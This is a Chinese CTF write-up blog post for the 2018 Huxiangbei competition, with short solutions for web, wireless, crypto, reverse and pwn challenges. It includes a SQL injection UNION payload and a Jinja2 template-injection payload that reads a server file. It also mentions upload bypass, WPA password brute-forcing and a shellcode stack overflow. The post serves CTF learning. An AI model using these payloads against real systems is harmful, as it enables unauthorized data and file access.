---
layout: posts
title: 湖湘杯2018Writeup--Wa1erDrop
date: 2018-11-19 15:24:47
tags: writeup
---

湖湘杯2018writeup

<!--more-->

## 题目名 Code check

解题思路、相关代码和 Flag 截图：

扫目录发现了 /news 下载源码

{% asset_img 1.png %}

根据源码构造加密程序

{% asset_img 2.png %}

Sql 注入

Payload:

(3/**/union/**/select/**/1,GROUP_CONCAT(id),GROUP_CONCAT(title),4/**/from/**/notice2hxb2018)

RUV4SUlhMG4vUFlITDVQdS9xMndUMlI0V2RwYlZkYVcvd3lLL0d5M2lENEFuNzFvVGNWTWRBTXB2ay8vVk9JbVBjZUxWWUhiZTlzMEtXVitnam5JcFo

{% asset_img 3.png %}

## 题目名 Flow

解题思路、相关代码和 Flag 截图：

Wireshark 打开发现为 802.11

弱密码爆破

{% asset_img 4.png %}

生成 psk

{% asset_img 5.png %}

{% asset_img 6.png %}

查找 flag

{% asset_img 7.png %}

## 题目名ReadFile

解题思路、相关代码和 Flag 截图：

{% asset_img 8.png %}

## 题目名：My Note

解题思路、相关代码和 Flag 截图：

文件上传，修改文件类型

{% asset_img 9.png %}

在目录中找到该文件，直接读取 flag

{% asset_img 10.png %}

## 题目名称 XmeO

解题思路、相关代码和 Flag 截图：

易知为模板注入

Payload:

```html
{{''.__class__.__mro__[2].__subclasses__()[40]('/home/XmeO/auto.js').read()}}
```

{% asset_img 11.png %}

## 题目名称 highwayhash64

第一眼以为是 md5，仔细一看是哈希（明明题目说了）

highwayhash64 在 GitHub 上搜了一下
[[https://github.com/google/highwayhash\]{.underline}](https://github.com/google/highwayhash)

找到了源码，再仔细对照算法，只有一个函数魔改了，其他都一样。

加密过程是：先对输入的长度进行校验，然后对数字部分进行校验。

{% asset_img 12.png %}

对着改成了文件的模样，先爆破了 digit 的长度是 10， 然后就可以开始爆破了。

{% asset_img 13.png %}

用的是 GitHub 上自带的 test 函数，稍微改了改

爆破的速度还是很快的，队员 3 个人各跑了一下确定了区间，最后得解。

{% asset_img 14.png %}

## 题目名称 regex format

只要正确理解了：和、$那段解析判断就非常简单了

简单模拟了一个正则表达式 : 和、$ 中的内容是可以出现的内容

例如 :a$+ 就可以出现 1000 次 a 这样

而且题目关了 NX

因此可以栈溢出，控制程序跳到 bss 段，然后在 bss 段填 shellcode ，get
shell

{% asset_img 15.png %}

{% asset_img 16.png %}

## 题目名称：Disk

这题有点脑洞

用 winhex 可以打开文件

发现有 4 个 flagx.txt 文件

对比发现后面有一段东西是不同的，但是都是 01 的，于是猜是 flag

{% asset_img 17.png %}

{% asset_img 18.png %}

脚本如下

```python
flag='0110011001101100011000010110011101'

flag+='1110110011010001000100010100110101'

flag+='1111001100010110111001011111010001'

flag+='0000110001011100110110101101111101'

s=''

for i in range(0,32,8):

s+=chr(int(flag[i:i+8],2))

for i in range(32,len(flag),8):

print(s,hex(int(flag[i:i+8],2)))

s+=chr(int(flag[i:i+8],2))

print(s)
```

## 题目名称：Common Crypto

逆向一下程序，发现是 AES 加密

{% asset_img 19.png %}

看到有一段赋值的，于是就猜那个是 key

拿去网上的解密网站

{% asset_img 20.png %}

解出前 16 位 flag

后面的就直接是可见字符

{% asset_img 21.png %}

## 题目名称 replace

这题比较简单

Upx 脱壳

{% asset_img 22.png %}

然后之后就是简单的替换

脚本如下

```python
a='2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6'

data = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01,

0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D,

0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4,

0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,

0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7,

0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,

0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E,

0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,

0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB,

0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB,

0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C,

0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,

0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C,

0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D,

0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A,

0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,

0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3,

0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,

0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A,

0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,

0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E,

0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9,

0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9,

0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,

0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99,

0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]

flag = ''

for i in range(0,len(a),2):

t = int(a[i:i+2],16)^0x19

idx = data.index(t)

flag+=chr(idx)

print(idx)

print(repr(flag))
```



{% asset_img 23.png %}

## 题目名称：welcome

差点忘了写这题题解。关注公众号即可

{% asset_img 24.png %}


